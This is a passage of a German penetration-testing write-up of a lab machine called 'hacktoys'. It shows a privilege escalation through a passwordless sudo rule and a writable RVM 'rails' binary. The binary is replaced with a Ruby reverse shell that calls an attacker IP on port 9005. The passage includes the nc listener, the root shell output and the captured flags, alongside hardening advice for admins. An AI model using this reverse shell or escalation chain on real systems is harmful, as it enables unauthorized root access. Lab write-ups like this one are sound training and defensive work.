+                       <pre>
+Matching Defaults entries for dodi on hacktoys:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User dodi may run the following commands on hacktoys:
+    <span class="password">(ALL : ALL) NPASSWD: /usr/local/bin/rvm_rails.sh</span>
+                       </pre>
+                         <div class="prompt">dodi@hacktoys:/tmp$ <span class="command">ls -la /usr/local/bin/rvm_rails.sh</span></div>
+                         <pre>-rwxr-xr-x 1 <span class="command">root root</span> 660 May 20 17:02 /usr/local/bin/rvm_rails.sh</pre>
+                   </div>
+               </div>
+                <p class="analysis">**Analyse:**
+               1.  Wir lesen die User-Flag für `dodi`.
+               2.  *(Optional/Redundant)* Es wird ein SSH-Schlüssel für `dodi` eingerichtet, was für den weiteren Verlauf nicht notwendig ist, da wir bereits eine Shell haben.
+               3.  `sudo -l` für `dodi` zeigt, dass er das Skript `/usr/local/bin/rvm_rails.sh` als `ALL:ALL` (effektiv `root`) ohne Passwort (`NOPASSWD`) ausführen darf.
+               4.  Das Skript gehört `root` und ist für `dodi` nicht direkt schreibbar.</p>
+                <p class="evaluation">**Bewertung:** Dies ist der klare Privesc-Vektor zu Root. Wir müssen das Skript `/usr/local/bin/rvm_rails.sh` analysieren, um zu sehen, ob wir sein Verhalten manipulieren können.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Den Inhalt von `/usr/local/bin/rvm_rails.sh` untersuchen (`cat`). Prüfen, ob es externe Befehle mit relativen Pfaden aufruft oder auf Dateien zugreift, die wir kontrollieren können.
+                **Empfehlung (Admin):** `sudo`-Regeln für Skripte genau prüfen. Sicherstellen, dass Skripte, die mit Root-Rechten laufen, nicht leicht manipulierbar sind (z.B. durch PATH Hijacking, unsichere Dateizugriffe).</p>
+
+                <div class="code-block">
+                    <div class="terminal">
+                         <div class="prompt">dodi@hacktoys:/tmp$ <span class="command">cat /usr/local/bin/rvm_rails.sh</span></div>
+                         <pre>
+#!/bin/bash
+# Script to manage Rails applications using RVM
+
+# Source RVM environment
+source /etc/profile.d/rvm.sh &> /dev/null || source ~/.rvm/scripts/rvm &> /dev/null
+
+# Check if a command is provided
+if [ -z "$1" ]; then
+    echo "Usage: $0 [rails_command]"
+    exit 1
+fi
+
+# Execute the rails command
+echo "Executing Rails command: $@"
+<span class="password">exec /usr/local/rvm/gems/ruby-3.1.0/bin/rails "$@"</span> <span class="password"># Ruft 'rails' ohne absoluten Pfad auf!</span>
+                         </pre>
+                    </div>
+                </div>
+                 <p class="analysis">**Analyse:** Das Skript `/usr/local/bin/rvm_rails.sh` lädt die RVM (Ruby Version Manager)-Umgebung und führt dann den Befehl `<span class="password">rails</span>` mit den übergebenen Argumenten aus. Wichtig ist, dass `/usr/local/rvm/gems/ruby-3.1.0/bin/rails` direkt aufgerufen wird, *nicht* `rails` über den System-PATH.</p>
+                 <p class="evaluation">**Bewertung:** Der Aufruf von `/usr/local/rvm/gems/ruby-3.1.0/bin/rails` erfolgt mit einem (quasi) absoluten Pfad. Ein einfaches PATH-Hijacking ist hier nicht möglich. Allerdings haben wir im vorherigen Schritt gesehen, dass der Benutzer `lidia` (zu dem `dodi` keinen direkten Zugriff hat) möglicherweise Schreibrechte auf Dateien innerhalb des RVM-Pfades haben könnte (da `lidia` zur `rvm`-Gruppe gehört). Der Exploit im Log deutet darauf hin, dass das `/usr/local/rvm/gems/ruby-3.1.0/bin/rails`-Binary selbst ersetzt werden kann.</p>
+                 <p class="recommendation">**Empfehlung (Pentester):**
+                    1. Überprüfen, ob das Verzeichnis `/usr/local/rvm/gems/ruby-3.1.0/bin/` oder die Datei `rails` darin für `dodi` oder eine Gruppe, der `dodi` angehört, schreibbar ist (`ls -ld /usr/local/rvm/gems/ruby-3.1.0/bin/`, `ls -l /usr/local/rvm/gems/ruby-3.1.0/bin/rails`).
+                    2. **Wenn schreibbar:** Das Original-`rails`-Binary sichern, durch ein eigenes Skript (z.B. Ruby-Reverse-Shell) ersetzen und `sudo /usr/local/bin/rvm_rails.sh` ausführen.
+                    3. **Wenn nicht schreibbar (wahrscheinlicher):** Der im Log gezeigte Exploit-Pfad erfordert Schreibrechte als `lidia`. Wir müssen also den Wechsel zu `lidia` wiederholen (oder die Shell offen halten) und dann als `lidia` das `rails`-Binary ersetzen. Anschließend als `dodi` den `sudo`-Befehl ausführen.
+                 **Empfehlung (Admin):** Berechtigungen für systemweite Installationen (wie RVM) härten. Sicherstellen, dass Binaries nicht von unprivilegierten Benutzern überschrieben werden können. `sudo`-Regeln vermeiden, die auf potenziell manipulierbare Skripte oder Binaries verweisen.</p>
+
+                 <p class="comment">Wir führen den Exploit durch, indem wir (als `lidia`) das `rails`-Binary durch eine Ruby-Reverse-Shell ersetzen und dann (als `dodi`) das `sudo`-Skript ausführen.</p>
+                <div class="code-block">
+                    <div class="terminal">
+                         <div class="prompt"># <span class="command">(Als lidia, z.B. über SSH-Login)</span></div>
+                         <div class="prompt">lidia@hacktoys:/tmp$ <span class="command">nano rvm.sh</span></div>
+                         <pre>
+#!/usr/bin/env ruby
+require 'socket'
+s = Socket.new 2,1
+s.connect Socket.sockaddr_in <span class="command">9005</span>, '<span class="command">192.168.2.199</span>' <span class="password"># Reverse Shell Ziel</span>
+[0,1,2].each {|fd| syscall 33, s.fileno, fd }
+exec '/bin/sh -i'
+                         </pre>
+                          <div class="prompt">lidia@hacktoys:/tmp$ <span class="command">mv rvm.sh rails</span></div>
+                          <div class="prompt">lidia@hacktoys:/tmp$ <span class="command">mv rails /usr/local/rvm/gems/ruby-3.1.0/bin/rails</span></div> <span class="password"># Original überschreiben (erfordert Schreibrechte als lidia!)</span>
+                          <div class="prompt">lidia@hacktoys:/tmp$ <span class="command">ls -la /usr/local/rvm/gems/ruby-3.1.0/bin/rails</span></div>
+                          <pre>-rwxrwxrwx 1 lidia lidia 174 Sep  8 00:47 /usr/local/rvm/gems/ruby-3.1.0/bin/rails</pre> <span class="password">(Berechtigungen scheinen unsicher)</span>
+                           <div class="prompt"># <span class="command">(Listener auf Angreifer-Maschine starten)</span></div>
+                            <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 9005</span></div>
+                            <pre>listening on [any] 9005 ...</pre>
+                           <div class="prompt"># <span class="command">(Als dodi, z.B. über die FastCGI-Shell oder SSH)</span></div>
+                            <div class="prompt">dodi@hacktoys:/tmp$ <span class="command">sudo -u root /usr/local/bin/rvm_rails.sh</span></div> <span class="password"># Beliebiges Argument wird ignoriert</span>
+                             <div class="prompt"># <span class="command">(Listener empfängt Verbindung)</span></div>
+                             <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 9005</span></div>
+                             <pre>
+listening on [any] 9005 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.126] 44690</span>
+# id
+<span class="command">uid=0(root) gid=0(root) groups=0(root),1002(rvm)</span>
+# <span class="password"># Root-Shell erhalten!</span>
+                             </pre>
+                       </div>
+                   </div>
+                   <p class="analysis">**Analyse:**
+                  1.  Wir (als `lidia`) erstellen eine Ruby-Reverse-Shell, die sich zu unserer IP auf Port 9005 verbindet.
+                  2.  Wir benennen das Skript in `rails` um.
+                  3.  Wir verschieben/überschreiben das originale `rails`-Binary im RVM-Pfad mit unserem Skript. Dies funktioniert, da `lidia` (oder die Gruppe `rvm`) offenbar Schreibrechte in diesem Verzeichnis hat.
+                  4.  Wir starten einen Listener auf Port 9005.
+                  5.  Wir (als `dodi`) führen das `sudo`-Skript aus: `sudo -u root /usr/local/bin/rvm_rails.sh`.
+                  6.  Das `rvm_rails.sh`-Skript führt nun unser manipuliertes `rails`-Skript (die Ruby-Reverse-Shell) als `root` aus.
+                  7.  Unser Listener empfängt die Verbindung, und wir haben eine Root-Shell.</p>
+                   <p class="evaluation">**Bewertung:** Privilege Escalation zu Root erfolgreich! Die Kombination aus einer unsicheren `sudo`-Regel für `dodi` und unsicheren Dateiberechtigungen im RVM-Verzeichnis, die `lidia` das Überschreiben eines Binaries erlaubten, wurde ausgenutzt.</p>
+                   <p class="recommendation">**Empfehlung (Pentester):** Root-Flag lesen. Bericht abschließen. Das originale `rails`-Binary wiederherstellen (optional).
+                   **Empfehlung (Admin):** Unsichere `sudo`-Regel entfernen. Dateiberechtigungen für systemweite Tools/Bibliotheken (wie RVM) härten. Prinzip der geringsten Rechte für alle Benutzer durchsetzen.</p>
+
+                   <p class="comment">Als Root lesen wir die Flags.</p>
+                    <div class="code-block">
+                        <div class="terminal">
+                             <div class="prompt"># <span class="command">cd /root</span></div>
+                             <div class="prompt"># <span class="command">ls</span></div>
+                             <pre><span class="command">root.txt</span></pre>
+                             <div class="prompt"># <span class="command">cat root.txt</span></div>
+                             <pre><span class="password">64aa5a7aaf42af74ee6b59d5ac5c1509</span></pre>
+                         </div>
+                    </div>
+                    <p class="analysis">**Analyse:** Aus der Root-Shell lesen wir die `/root/root.txt`.</p>
+                    <p class="evaluation">**Bewertung:** Root-Flag erfolgreich gelesen.</p>
+                    <p class="recommendation">**Empfehlung (Pentester):** Ergebnisse dokumentieren.
+                    **Empfehlung (Admin):** Alle identifizierten Schwachstellen beheben.</p>
+            </section>
+
+            <section id="flags">
+                 <div class="flag-container">
+                    <h2 class="flag-heading">Flags</h2>
+                    <div class="flag-entry">
+                        <div class="flag-command">cat /home/dodi/user.txt</div>
+                        <div class="flag-value"><span class="password">b075b24bdb11990e185c32c43539c39f</span></div>
+                    </div>
+                    <div class="flag-entry">
+                        <div class="flag-command">cat /root/root.txt</div>
+                        <div class="flag-value"><span class="password">64aa5a7aaf42af74ee6b59d5ac5c1509</span></div>
+                    </div>
+                </div>
+            </section>
+ 
+
+        <footer class="footer">
+            <p>DarkSpirit - Cyber Security Reports</p>
+            <p>Berichtsdatum: 4. September 2024</p> <!-- Datum aus Nmap Scan extrahiert -->
+        </footer>
+    </body>
+    </html>
